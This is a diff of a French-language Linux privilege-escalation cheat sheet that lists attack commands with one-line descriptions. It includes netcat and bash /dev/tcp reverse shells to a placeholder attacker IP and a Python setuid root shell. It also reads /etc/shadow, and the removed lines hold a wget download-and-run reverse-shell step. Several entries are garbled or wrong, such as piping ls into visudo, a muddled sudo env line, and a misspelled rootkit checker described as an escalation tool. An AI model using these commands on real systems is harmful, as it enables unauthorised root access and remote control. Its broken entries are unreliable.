@@ -2,44 +2,36 @@
 
 ```sudo -l``` : Liste des commandes sudo autorisées pour l'utilisateur actuel
 
-whoami : Affiche l'utilisateur courant
+```find / -perm -4000``` : Recherche des fichiers avec le bit setuid activé
 
-id : Affiche les UID et GID de l'utilisateur
+```find / -perm -2000``` : Recherche des fichiers avec le bit setgid activé
 
-find / -perm -4000 : Recherche des fichiers avec le bit setuid activé
+```ls -la /etc/sudoers.d/ | visudo``` : Vérifie les fichiers de configuration sudo
 
-find / -perm -2000 : Recherche des fichiers avec le bit setgid activé
+```cat /etc/passwd``` : Liste des utilisateurs
 
-ls -la /etc/sudoers.d/ : Vérifie les fichiers de configuration sudo
+```cat /etc/shadow``` : Affiche les mots de passe chiffrés (nécessite des privilèges)
 
-cat /etc/passwd : Liste des utilisateurs
+```chmod +s /path/to/executable``` : Définit le bit setuid sur un exécutable
 
-cat /etc/shadow : Affiche les mots de passe chiffrés (nécessite des privilèges)
+```python -c 'import os; os.setuid(0); os.system("/bin/bash")'``` : Exécution d'une commande avec les privilèges root via Python
 
-chmod +s /path/to/executable : Définit le bit setuid sur un exécutable
+```perl -e 'exec "/bin/bash";'``` : Escalade de privilèges via Perl
 
-python -c 'import os; os.setuid(0); os.system("/bin/bash")' : Exécution d'une commande avec les privilèges root via Python
+```nc -e /bin/bash <attacker-ip> <port>``` : Shell inverse avec netcat (si autorisé)
 
-perl -e 'exec "/bin/bash";' : Escalade de privilèges via Perl
+```/bin/bash -i >& /dev/tcp/<attacker-ip>/<port> 0>&1``` : Shell inverse via Bash
 
-nc -e /bin/bash <attacker-ip> <port> : Shell inverse avec netcat (si autorisé)
+```dmesg | grep -i 'version'``` : Recherche de la version du noyau (pour trouver des exploits de vulnérabilité du noyau)
 
-/bin/bash -i >& /dev/tcp/<attacker-ip>/<port> 0>&1 : Shell inverse via Bash
+```ls /lib/x86_64-linux-gnu/ld-*.so``` : Recherche des chemins vers le chargeur dynamique
 
-wget <url> -O /tmp/reverse_shell.sh && chmod +x /tmp/reverse_shell.sh && /tmp/reverse_shell.sh : Téléchargement et exécution d'un script malveillant
+```env VAR='bash -i' sudo -u root /bin/bash``` : Exécution de Bash avec les privilèges root via sudo
 
-setuid binary exploitation : Exploitation de binaires setuid pour obtenir des privilèges root
+```su -``` : Changer d'utilisateur (si privilèges nécessaires)
 
-dmesg | grep -i 'version' : Recherche de la version du noyau (pour trouver des exploits de vulnérabilité du noyau)
+```cron job``` : Exploitation des tâches cron mal configurées pour l'escalade
 
-ls /lib/x86_64-linux-gnu/ld-*.so : Recherche des chemins vers le chargeur dynamique
+```auditctl -l``` : Vérifie les règles d'audit pour détecter des privilèges inutiles
 
-env VAR='bash -i' sudo -u root /bin/bash : Exécution de Bash avec les privilèges root via sudo
-
-su - : Changer d'utilisateur (si vous avez les privilèges nécessaires)
-
-cron job : Exploitation des tâches cron mal configurées pour l'escalade
-
-auditctl -l : Vérifie les règles d'audit pour détecter des privilèges inutiles
-
-checkrootkit : Détecte des rootkits pour escalader les privilèges
+```checkrootkit``` : Détecte des rootkits pour escalader les privilèges
